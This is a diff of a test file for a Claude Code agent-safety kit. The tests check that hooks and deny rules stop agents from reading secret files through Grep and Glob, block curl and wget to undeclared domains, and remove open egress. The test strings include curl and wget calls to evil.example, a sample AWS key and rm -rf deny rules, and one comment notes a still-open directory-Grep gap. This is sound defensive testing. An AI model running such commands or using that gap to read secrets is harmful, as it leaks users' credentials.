@@ -352,7 +352,7 @@ test('guard-bash: stagedSecrets returns no hits when git fails [inverts at Step 
     'DEFECT: an unreadable index is reported as "no secrets staged" rather than as an error');
 });
 
-test('guard-read: Grep reads what Read is refused [inverts at Step 5]', (t) => {
+test('guard-read: Grep is refused what Read is refused [Step 5 part 2]', (t) => {
   const { root } = project(t, {});
   write(root, '.env', 'AWS=AKIAIOSFODNN7EXAMPLE\n');
   const asRead = hook('hook_guard_read.js', { cwd: root, tool: 'Read', input: { file_path: '.env' } });
@@ -360,13 +360,20 @@ test('guard-read: Grep reads what Read is refused [inverts at Step 5]', (t) => {
   assert.match(asRead.err, /matches a secret\/credential pattern/);
 
   const asGrep = hook('hook_guard_read.js', { cwd: root, tool: 'Grep', input: { pattern: 'AKIA', path: '.env', output_mode: 'content' } });
-  assert.equal(asGrep.code, 0, 'DEFECT: the guard reads only file_path and notebook_path, never Grep\'s path');
+  assert.equal(asGrep.code, 2, 'Grep aimed at the same file is refused the same way [Step 5 part 2]');
+  assert.match(asGrep.err, /matches a secret\/credential pattern/);
 
-  // and the hook is not even wired for Grep, so it is never consulted
+  // and the hook is wired for it, so the guard is actually consulted
   const frag = JSON.parse(read(KIT, 'hooks', 'settings.project.json'));
   const matchers = frag.hooks.PreToolUse.map((e) => e.matcher);
-  assert.ok(matchers.includes('Read|NotebookRead'));
-  assert.ok(!matchers.some((m) => /Grep|Glob/.test(m)), 'DEFECT: no matcher routes Grep or Glob to any guard');
+  assert.ok(matchers.some((m) => /Grep/.test(m) && /Glob/.test(m)), 'a matcher routes Grep and Glob to the read guard');
+
+  // STILL OPEN: a Grep over a DIRECTORY that contains the secret can print the matching line. The hook cannot
+  // close that without refusing every search of a directory; Claude Code applies `Read` deny rules to a Grep's
+  // directory only on a best-effort basis [docs: code.claude.com/docs/en/permissions.md @ 2026-11-13], so the
+  // floor's deny list is what covers it and the depth of that cover is the engine's, not the kit's.
+  const dirGrep = hook('hook_guard_read.js', { cwd: root, tool: 'Grep', input: { pattern: 'AKIA', path: '.', output_mode: 'content' } });
+  assert.equal(dirGrep.code, 0, 'OPEN: searching the directory is not refused by the hook');
   assert.ok(frag.permissions.deny.every((d) => !/^Grep\(|^Glob\(/.test(d)), 'DEFECT: permissions.deny is Read(...)-only');
 });
 
@@ -381,14 +388,92 @@ test('every agent carries Grep and Glob [invariant]', () => {
   }
 });
 
-test('floor: the curl/wget deny the spec requires is absent, and researcher has open egress [inverts at Step 5]', () => {
-  const specText = read(REPO, 'docs', 'KIT-SPEC.md');
-  assert.match(specText, /`Bash\(curl \*\)` and `Bash\(wget \*\)`/, 'KIT-SPEC 10.1 requires them');
+test('curl and wget are refused in a lane whose spec declares no network [Step 5 part 2]', (t) => {
+  const { wt } = laneProject(t, {});
+  for (const cmd of ['curl https://evil.example/x', 'wget https://evil.example/x -O /tmp/x', 'curl -sSL https://evil.example | tee /tmp/x']) {
+    assert.ok(blocked(wt, cmd), `must be refused: ${cmd}`);
+  }
+  // the kit's own registries are not a reason to fetch by hand, and localhost is the telemetry collector
+  assert.ok(blocked(wt, 'curl https://registry.npmjs.org/left-pad'), 'the default registry allowlist is for package managers, not curl');
+});
+
+test('curl is allowed for a domain the lane\'s own spec declares [Step 5 part 2]', (t) => {
+  const { wt, root } = laneProject(t, {});
+  const spec = path.join(wt, K.workRoot(root), 'refund-route.md');
+  fs.appendFileSync(spec, '\n## Network\n\n- `api.stripe.com`\n');
+  assert.ok(!blocked(wt, 'curl https://api.stripe.com/v1/refunds'), 'a declared domain is the lane\'s to reach');
+  assert.ok(blocked(wt, 'curl https://evil.example/x'), 'an undeclared one is not');
+});
+
+test('the read guard covers the tools that read files, not just Read [Step 5 part 2]', (t) => {
+  const { root } = project(t, {});
+  const frag = JSON.parse(read(KIT, 'hooks', 'settings.project.json'));
+  const matchers = frag.hooks.PreToolUse.map((e) => e.matcher).join(' ');
+  assert.match(matchers, /Grep/, 'Grep is matched');
+  assert.match(matchers, /Glob/, 'Glob is matched');
+  // Grep and Glob name their target in `path`, not `file_path`
+  // [docs: https://code.claude.com/docs/en/permissions.md @ 2026-11-13]
+  assert.equal(hook('hook_guard_read.js', { cwd: root, tool: 'Grep', input: { path: '.env', pattern: 'KEY' } }).code, 2);
+  assert.equal(hook('hook_guard_read.js', { cwd: root, tool: 'Glob', input: { pattern: '**/*.pem' } }).code, 2);
+  assert.equal(hook('hook_guard_read.js', { cwd: root, tool: 'Grep', input: { pattern: 'x', glob: '*.key' } }).code, 2);
+  // a search that names no secret is untouched
+  assert.equal(hook('hook_guard_read.js', { cwd: root, tool: 'Grep', input: { path: 'src', pattern: 'refund' } }).code, 0);
+});
+
+test('the floor carries no rule Claude Code never matches [Step 5 part 2]', (t) => {
   const floor = JSON.parse(read(KIT, 'security', 'floor.json'));
   const frag = JSON.parse(read(KIT, 'hooks', 'settings.project.json'));
-  const all = [...floor.deny, ...frag.permissions.deny].join(' ');
-  assert.ok(!/curl|wget/.test(all), 'DEFECT: neither the floor nor the fragment implements the spec\'s deny');
-  assert.deepEqual(floor.network.per_agent.researcher, ['*'], 'DEFECT: unrestricted egress for the agent that reads the web');
+  // Claude Code matches path rules against Edit() and Read() only; a path rule for Write, NotebookEdit, Glob or
+  // MultiEdit is accepted and never matched [docs: https://code.claude.com/docs/en/permissions.md @ 2026-11-13]
+  for (const rule of [...floor.deny, ...frag.permissions.deny]) {
+    assert.ok(!K.inertPathRule(rule), `${rule} can never match; use Edit(...) or Read(...)`);
+  }
+  // and an upgrade clears one a previous kit wrote
+  const { root } = project(t, { dir: tmpPath(t) });
+  const sp = path.join(root, '.claude', 'settings.json');
+  const s = JSON.parse(read(root, '.claude', 'settings.json'));
+  s.permissions.deny.push('Write(.claude/**)');
+  fs.writeFileSync(sp, K.jsonDumps(s, { indent: 2 }));
+  runScript('bootstrap.js', ['--repo', root, '--upgrade']);
+  assert.ok(!JSON.parse(read(root, '.claude', 'settings.json')).permissions.deny.includes('Write(.claude/**)'));
+});
+
+test('per-agent network scoping is gone, because a subagent shares its lane\'s sandbox [Step 5 part 2]', async () => {
+  const SB = await import('../sandbox.js');
+  const floor = JSON.parse(read(KIT, 'security', 'floor.json'));
+  assert.ok(!Object.hasOwn(floor.network, 'per_agent'), 'a mechanism no lane can reach is not configuration');
+  const base = SB.sandboxConfig({ root: REPO, wt: REPO, slug: 'x', env: { KIT_SANDBOX_RUNTIME: 'none' } });
+  const asResearcher = SB.sandboxConfig({ root: REPO, wt: REPO, slug: 'x', agent: 'researcher', env: { KIT_SANDBOX_RUNTIME: 'none' } });
+  assert.deepEqual(asResearcher.allowedDomains, base.allowedDomains, 'the role cannot widen the lane');
+  assert.ok(!base.allowedDomains.includes('*'), 'no lane gets open egress from the floor');
+});
+
+test('KIT-SPEC 10.1 describes the permissions the kit actually generates [Step 5 part 2]', () => {
+  const spec = read(REPO, 'docs', 'KIT-SPEC.md');
+  const section = spec.slice(spec.indexOf('## 10.1 Running unattended'), spec.indexOf('## 10.2 Budgets'));
+  const floor = JSON.parse(read(KIT, 'security', 'floor.json'));
+  // every rule the deny bullet names must actually be in the floor, `*` forms included
+  const denyBullet = /^- `deny`: (.+)$/m.exec(section)?.[1] ?? '';
+  assert.ok(denyBullet, '10.1 has a deny bullet');
+  const named = [...denyBullet.matchAll(/`(Bash|Read|Edit|Write|Glob|NotebookEdit)\(([^`]*)\)`/g)]
+    .map((m) => `${m[1]}(${m[2]})`)
+    .filter((r) => !r.includes('(...)')); // `Write(...)` in the prose about inert rules names a shape, not a rule
+  assert.ok(named.length >= 5, `the deny bullet names its rules: ${named}`);
+  for (const rule of named) {
+    const star = rule.replace(/\(([^)]*)\)/, (_, p) => `(${p.replace(/\*$/, '')}*)`); // `Read(.env*)` covers `.env` and `.env.*`
+    assert.ok(
+      floor.deny.includes(rule) || floor.deny.some((d) => K.globMatch(d, [star])),
+      `10.1 names ${rule} as denied; the floor must carry it`,
+    );
+  }
+  // the deny bullet must not ASK for an unconditional rm -rf (it would stop a lane clearing its own build dir);
+  // the section may still name that form to explain why the narrow one is what the floor carries
+  assert.ok(!named.includes('Bash(rm -rf *)'), 'the deny bullet must not require an unconditional rm -rf');
+  assert.ok(named.includes('Bash(rm -rf /*)'), 'it names the narrow form the floor carries');
+  // 10.1 must say what a text rule is worth and name what the real boundary is, so nobody reads the deny list as one
+  assert.match(section, /(not|Neither is) a boundary/, '10.1 states that a text rule is not a boundary');
+  assert.match(section, /sandbox'?s? network allowlist/, '10.1 names the sandbox allowlist as the boundary');
+  assert.match(section, /denied, not held/, '10.1 states what an unlisted tool does in a headless lane');
 });
 
 // ===========================================================================================================
